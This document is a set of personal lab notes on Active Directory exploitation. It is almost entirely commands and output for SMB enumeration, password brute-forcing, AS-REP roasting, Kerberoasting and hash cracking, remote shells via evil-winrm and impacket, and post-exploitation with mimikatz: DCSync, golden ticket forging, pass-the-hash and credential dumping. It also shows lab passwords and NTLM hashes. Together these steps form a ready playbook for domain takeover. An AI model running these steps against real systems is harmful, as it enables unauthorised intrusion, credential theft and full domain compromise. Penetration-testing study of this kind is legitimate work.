This is a collection of notes about active directory and (post)exploitation

# Enumeration

## Check smb version and server info

metasploit

	msf6 auxiliary(scanner/smb/smb_version) > run
	[*] 192.168.200.100:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:15m 42s) (guid:{0e6e2ca3-2bd4-4307-8e35-70564748263c}) (authentication domain:VALHALLA)
	[+] 192.168.200.100:445   -   Host is running Windows 2012 R2 Standard Evaluation (build:9600) (name:ODIN) (domain:VALHALLA)
	[*] valhalla.local:       - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_version) >


crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)


## Enum Local users


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-lookupsid valhalla/thor:Pass123\!@192.168.200.110
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Brute forcing SIDs at 192.168.200.110
	[*] StringBinding ncacn_np:192.168.200.110[\pipe\lsarpc]
	[*] Domain SID is: S-1-5-21-3401829504-2746700306-4210517594
	500: THOR\Administrator (SidTypeUser)
	501: THOR\Guest (SidTypeUser)
	513: THOR\None (SidTypeGroup)
	1000: THOR\win7 (SidTypeUser)


## Password Bruteforce

Metasploit

	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
	pass_file => pword.txt
	msf6 auxiliary(scanner/smb/smb_login) > run

	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:admin',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:password',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:s3cr3t',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:12345',
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	
	
Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:admin STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:password STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:s3cr3t STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:12345 STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123!



## Enum Shares

smb_enumshares (Metasploit)

	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
	smbuser => thor
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_enumshares) > set rhosts 192.168.200.100
	rhosts => 192.168.200.100
	msf6 auxiliary(scanner/smb/smb_enumshares) > run

	[-] 192.168.200.100:139   - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
	[!] 192.168.200.100:445   - peer_native_os is only available with SMB1 (current version: SMB3)
	[!] 192.168.200.100:445   - peer_native_lm is only available with SMB1 (current version: SMB3)
	[+] 192.168.200.100:445   - ADMIN$ - (DISK) Remote Admin
	[+] 192.168.200.100:445   - C$ - (DISK) Default share
	[+] 192.168.200.100:445   - IPC$ - (IPC) Remote IPC
	[+] 192.168.200.100:445   - NETLOGON - (DISK) Logon server share 
	[+] 192.168.200.100:445   - SYSVOL - (DISK) Logon server share 
	[*] 192.168.200.100:      - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed


crackmaexec (--shares)

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123! 
	SMB         192.168.200.100 445    ODIN             [+] Enumerated shares
	SMB         192.168.200.100 445    ODIN             Share           Permissions     Remark
	SMB         192.168.200.100 445    ODIN             -----           -----------     ------
	SMB         192.168.200.100 445    ODIN             ADMIN$                          Remote Admin
	SMB         192.168.200.100 445    ODIN             C$                              Default share
	SMB         192.168.200.100 445    ODIN             IPC$                            Remote IPC
	SMB         192.168.200.100 445    ODIN             NETLOGON        READ            Logon server share 
	SMB         192.168.200.100 445    ODIN             SYSVOL          READ            Logon server share 



## Checking your rights for remote device

SMB_Login (Metasploit)

	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
	smbuser => administrator
	msf6 auxiliary(scanner/smb/smb_login) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_login) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_login) > run
	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_login) > 
	
Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\administrator:Pass123! (Pwn3d!)



## ms17_010_eternalblue


	msf6 auxiliary(scanner/smb/smb_ms17_010) > run

	[+] 192.168.200.110:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
	[*] 192.168.200.110:445   - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_ms17_010) > 
	

## Sharphound

	If you want to run Sharphound from a PC that is not joined to the target domain, open a command prompt and run:

	runas /netonly /user:DOMAIN\USER powershell.exe

	Enter the password for DOMAIN\USER:

	Attempting to start powershell.exe as user "DOMAIN\USER" ...

	Then import Sharpound and run it as normal.

	import-module sharphound.ps1

	invoke-bloodhound -collectionmethod all -domain TARGETDOMAIN
	
	.\SharpHound.exe --CollectionMethod all -d valhalla.local
	

## Bloodhound

	sudo apt-get install bloodhound

	sudo neo4j console (change initial password / http://127.0.0.1:7474 / neo4j - neo4j)
	
	bloodhound (another terminal)

## AS-REP Roasting

Activate

![image](https://user-images.githubusercontent.com/13157446/129409430-5b5cc59e-5ed3-4370-b8bf-f1fe1a00ef98.png)

Run Rubeus

	PS C:\Users\thor\Desktop> .\Rubeus.exe asreproast

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: AS-REP roasting

	[*] Target Domain          : valhalla.local

	[*] Searching path 'LDAP://odin.valhalla.local/DC=valhalla,DC=local' for AS-REP roastable users
	[*] SamAccountName         : roastme
	[*] DistinguishedName      : CN=roastme,CN=Users,DC=valhalla,DC=local
	[*] Using domain controller: odin.valhalla.local (192.168.200.100)
	[*] Building AS-REQ (w/o preauth) for: 'valhalla.local\roastme'
	[+] AS-REQ w/o preauth successful!
	[*] AS-REP hash:

		  $krb5asrep$roastme@valhalla.local:F4871226F4E82B420B51A83FF0ADC8ED$7BA4EC10E4675
		  3B204A053744C7B003E5DDBC699CD6B3DB541865246D3E1ED7C798DE2245040824916266EBACF959
		  1A663AF9A85129F51474CD250DAF4F290D24DCEAA196CC28B807431D4222EF1CDCBA40835FF6FC1A
		  CF607A0291412D4E59E181359B6452AABC55B917C064A38EEDE9FEC825EA1DD72414FAE178691A4C
		  541F26822317CB8B894E63581C90DD56A1D38DF0C1809F6A13B4166C4FB04A64C17ECF86D2538AF5
		  C3BA2E4EE2D101BAD135EE6B3784DBC36BD94AFCC79E0271F9B84D3E1BA73659202FD15AB9B37EF4
		  EEFB4C8318395D9FC80D8F83751030F799419BF16FED209F3BC2CFFB15FB9EBBC6A
	
	
Crack it 

	hashcat -m 18200 hash.txt 500.txt --force 

## Kerberoasting

Create OU for service accounts

![image](https://user-images.githubusercontent.com/13157446/129405912-68180d26-1ab2-447f-9e59-4d8f123ffec9.png)


Create service account

	#requires -module ActiveDirectory

	$destou="OU=Service Accounts,DC=valhalla,DC=local"

	$psw = convertto-securestring "Pass123!" -asplaintext -force
	New-ADUser -Path $destou -Name "kerberoastme"  -AccountPassword $psw -Enabled $true -AllowReversiblePasswordEncryption $false -CannotChangePassword $true -PasswordNeverExpires $true

Set SPN for service account

![Pasted image 20210813214029](https://user-images.githubusercontent.com/13157446/129405121-db8df286-38e3-4d16-a601-3bde3cf1da20.png)


Enum SPN users with Rubeus


	PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: Kerberoasting

	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

	[*] Searching the current domain for Kerberoastable users

	[*] Total kerberoastable users : 1


	[*] SamAccountName         : kerberoastme
	[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
	[*] ServicePrincipalName   : http/kerberoastme:80
	[*] PwdLastSet             : 13.08.2021 18:25:06
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash                   : $krb5tgs$23$*kerberoastme$valhalla.local$http/kerberoastme:80*$B186F27C57F71BA5F
								 241C8F4CEC3403D$A9F7BD89F86353311FAC0F723D490CEE6D045ABA26D43922AFF80BA6407219F8
								 AD5922E6C0681F3DCF8744B43C194CD52963C7667821068581058CFC7D98FD270E7BC5675E737B09
								 F35D9E646CECE872EC5731B272456C74BD6A8F15EF7F01ED90731CEF75C65B58C299CFC740F528B2
								 6B4CD0FB19929C81B474B0C4805D68680EA4E7C6B52433A16A8FFF72B7057D9E5BCC08931CD6E993
								 ACC28E2AEA5222EDDF3FAB46409D0D4348256F5D2C5E5EBACCE9A9DE1F4C1A498DA6F7A03BE83953
								 0109356BA479577185777F62A01803CC8F2FC9656FAF8AC6E0A2500F0CB5D539C2ABD4CD1A978B1A
								 777C840AA2B29DE5E10BC17F5DA3A343D639C13705359E91D2CE0D3F027784BDBDE049F119FC944C
								 975EE01CA80957640C985B13A99C0B8D425282EAD9F1EFB5714058664FFA83303F3B507089A27FA8
								 43540B17C72D9ED051E93C1301BA4CFF6BDA4B2B94FE2E96C878938F11DB6DF7769B561FB0299B8A
								 38412DA88AB43EC49227AFC39D59440C7524EFE7E8BB2B32F0C166922F2FF11132BB6F29CEE0A6B8
								 72BD55C119BAC3A620D0D13223ABCAC2ABAFB19B1599524293DADAC156337C34DB0E6AF072F90143
								 7FFA78BD944905947852F551AED626FD3617E50F6DB90E0442A5E9C5696E0B5FCCF40122ED22D344
								 997C7A928B19679CDB86D150CC840CA763F587359822B7C31138BEFA2C97CBFF4DA29C577F7685FD
								 86C277B12902E8EB36228AB75F331A952D98AFDD6573CD97EFF8C5C786B2C1B6A5B767873273F1D7
								 231E785CE95CC92E2985707124FA18EE4D0FA80CBB82A843BFD6B7B8948210C2482CA4FB7DE7ABD9
								 BBFB42BA5779AFDFA9480DBC36171243ABA03D08FA541BE39937B13ABF68BF81CC4B658FF928FDD7
								 D7C4465D6661D1D87EC1924796D4A3B9EC26CABD5EBA1E4034C3B9D7A6CEB956D07DE65F5DC6AC66
								 A83C355F8E3863A13E616F6CC26CA915850A071209987AC640F429499CC57C3E7B3F750434BE8B2D
								 30BB264733415B5008EF4B3342A6F8F395698932D07181B7A6CCBEA5735E034B2C6C6A21C3B17991
								 58AD4C0F012B2AA3FFA99E7BC13F738FCF79877DEC4425D79C755EC7D1C20061A47D9DD61A02D40D
								 10A13F2DC862DE99DAB8530C3839BDA09E3F9A49887E51E2A1C1A98A0294C200F472D95E79B7824B
								 200A6342961613E1B2B986916DF92C0CEA020CDC6CB495DF08BE5B505821D537F1105CD23B359040
								 88967AC0301801A6F3B3703BDB007DF6042798D806D2CA97639BFDD4383F835B946049ABA764BD8F
								 54FC2C5C500EE9D5E2720024A9AC1FE76D022F0A19073476F5E067FF167A179B4B5EC285217D09ED
								 F08E16DECB81A15F8CC3AE2D98FF9BAFEA3191A5912E9022799EAF418BEE9E997DFB66F5D06EB92A
								 B4BDC1BBBA491E3A9BCD594692ACCE4959701051D2B1770689817B4497


Save hashcat format


	PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast /outfile:hash.txt /format:hashcat

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: Kerberoasting

	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

	[*] Searching the current domain for Kerberoastable users

	[*] Total kerberoastable users : 1


	[*] SamAccountName         : kerberoastme
	[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
	[*] ServicePrincipalName   : http/kerberoastme:80
	[*] PwdLastSet             : 13.08.2021 18:25:06
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Users\thor\Desktop\hash.txt

	[*] Roasted hashes written to : C:\Users\thor\Desktop\hash.txt


Crack with hashcat


	hashcat -m 13100 hash.txt 500.txt --force 



# Remote Code Execution

Evil-WinRM

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙

	Evil-WinRM shell v3.2

	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

	Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

	Info: Establishing connection to remote endpoint

	*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

	Path
	----
	C:\Users\Administrator\Documents


	*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
	valhalla\administrator
	*Evil-WinRM* PS C:\Users\Administrator\Documents> 


## Impacket

wmiexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] SMBv3.0 dialect used
	[!] Launching semi-interactive shell - Careful what you execute
	[!] Press help for extra shell commands
	C:\>whoami
	valhalla\administrator

smbexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[!] Launching semi-interactive shell - Careful what you execute
	C:\Windows\system32>whoami
	nt authority\system


psexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Requesting shares on 192.168.200.100.....
	[*] Found writable share ADMIN$
	[*] Uploading file SJmjamtF.exe
	[*] Opening SVCManager on 192.168.200.100.....
	[*] Creating service qeWU on 192.168.200.100.....
	[*] Starting service qeWU.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 6.3.9600]
	(c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	nt authority\system


# Post-Exploitation

## Golden Ticket

activate debug mode

	mimikatz # privilege::debug
	
	
Get krbtgt user hash and sid value (remote) (fail because authentication problem)

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x00000005 (5)
	
	
Get krbtgt user hash and sid value (remote) 

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   : 
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   : 
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892


Generate Golden Ticket

	mimikatz # kerberos::golden /domain:valhalla.local /sid:S-1-5-21-3410397846-649609989-2919355437 /rc4:c2d3b9268608fab2b14a8c78c36316aa /id:500 /user:IgotGoldenTicketCharlie
	User      : IgotGoldenTicketCharlie
	Domain    : valhalla.local (VALHALLA)
	SID       : S-1-5-21-3410397846-649609989-2919355437
	User Id   : 500
	Groups Id : *513 512 520 518 519 
	ServiceKey: c2d3b9268608fab2b14a8c78c36316aa - rc4_hmac_nt      
	Lifetime  : 14.08.2021 01:11:51 ; 12.08.2031 01:11:51 ; 12.08.2031 01:11:51
	-> Ticket : ticket.kirbi

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Final Ticket Saved to file !
	
	
	
Inject ticket to current session
	
	mimikatz # kerberos::ptt ticket.kirbi

	* File: 'ticket.kirbi': OK


Open new cmd with injected ticket

	mimikatz # misc::cmd
	Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 000000004AC49C78

Access remote pc with normal shell

![image](https://user-images.githubusercontent.com/13157446/129424592-e3ed2a44-da5b-4092-a510-ec0c82c379af.png)


![image](https://user-images.githubusercontent.com/13157446/129424244-a7789524-03b0-454f-9c31-00ea922325a1.png)


Access remote pc 

![image](https://user-images.githubusercontent.com/13157446/129424569-f6d10db2-4e5f-402d-beb9-f827cb25fada.png)


![image](https://user-images.githubusercontent.com/13157446/129424166-5296aee2-0d58-4906-8331-19c1d34e3526.png)


## Machine Domain admin

	We need Local Admin rights on machine

	PS C:\Users\testuser\Desktop\mimikatz\x64> whoami
	thor\win7
	PS C:\Users\testuser\Desktop\mimikatz\x64> net user win7
	Kullanıcı adı                         win7
	Tam ad
	Açıklama
	Kullanıcı açıklaması
	Ülke kodu                             (null)
	Hesap etkin                           Evet
	Hesap zaman aşımı                     Asla

	Parolanın son ayarlanmadı             12.08.2021 23:35:30
	Parola süre sonu                      23.09.2021 23:35:30
	Değişebilir parola                    13.08.2021 23:35:30
	Parola gerekli                        Hayır
	Kullanıcı parolayı değiştirebilir     Evet

	İzin verilen iş istasyonları          Tümü
	Oturum açma kodu
	Kullanıcı profili
	Ana dizin
	Son oturum açma                       14.08.2021 13:08:24

	İzin verilen oturum açma saatleri     Tümü

	Yerel Grup Üyeliği                    *Administrators
										  *Users
	Genel Grup üyeliği                    *None
	Komut başarıyla tamamlandı.


Use mimikatz and read machine NTLM hash

Using 'Machine_hash.txt' for logfile : OK

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 996 (00000000:000003e4)
	Session           : Service from 0
	User Name         : THOR$
	Domain            : VALHALLA
	Logon Server      : (null)
	Logon Time        : 14.08.2021 01:02:17
	SID               : S-1-5-20
		msv :	
		 [00000003] Primary
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * NTLM     : f7e21314c3fb5d1c48a2d9d5b42b552c
		 * SHA1     : 9ec0546cae764e724a6348ada07efd896ab76458
		tspkg :	
		wdigest :	
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		kerberos :	
		 * Username : thor$
		 * Domain   : VALHALLA.LOCAL
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		ssp :	
		credman :	


Pash-the-Hash machine NTLM hash and spawn a CMD


	mimikatz # sekurlsa::pth /user:thor$ /domain:valhalla.loal /ntlm:f7e21314c3fb5d1c48a2d9d5b42b552c
	user	: thor$
	domain	: valhalla.loal
	program	: cmd.exe
	impers.	: no
	NTLM	: f7e21314c3fb5d1c48a2d9d5b42b552c
	  |  PID  1152
	  |  TID  752
	  |  LSA Process is now R/W
	  |  LUID 0 ; 2116305 (00000000:00204ad1)
	  \_ msv1_0   - data copy @ 000000000184D290 : OK !
	  \_ kerberos - data copy @ 000000000185DD68
	   \_ aes256_hmac       -> null             
	   \_ aes128_hmac       -> null             
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 00000000018FEF78 (16) -> null


![image](https://user-images.githubusercontent.com/13157446/129442879-3f6bdbfe-b0c9-45ed-8ed6-39331d5f2a77.png)

regular cmd shell (access denied)


![image](https://user-images.githubusercontent.com/13157446/129442954-661ab321-9c6b-4a35-9d6f-48e21d0821d1.png)


## Credential Collection

mimikatz (cmd needs to run administrators rights / locally)

	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gm
	  '#####'        > https://pingcastle.com / https://mysmartlogon

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 5990364 (00000000:005b67dc)
	Session           : CachedInteractive from 1
	User Name         : Administrator
	Domain            : VALHALLA
	Logon Server      : ODIN
	Logon Time        : 13.08.2021 11:47:21
	SID               : S-1-5-21-3410397846-649609989-2919355437-500
			msv :
			 [00000003] Primary
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * LM       : 4fb7d301186e0eb3695109ab020e401c
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			tspkg :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			wdigest :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			kerberos :
			 * Username : Administrator
			 * Domain   : VALHALLA.LOCAL
			 * Password : Pass123!
			ssp :
			credman :
			
			
mimikatz (dcsync / authuser should be admin rights)


	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   :
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   :
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
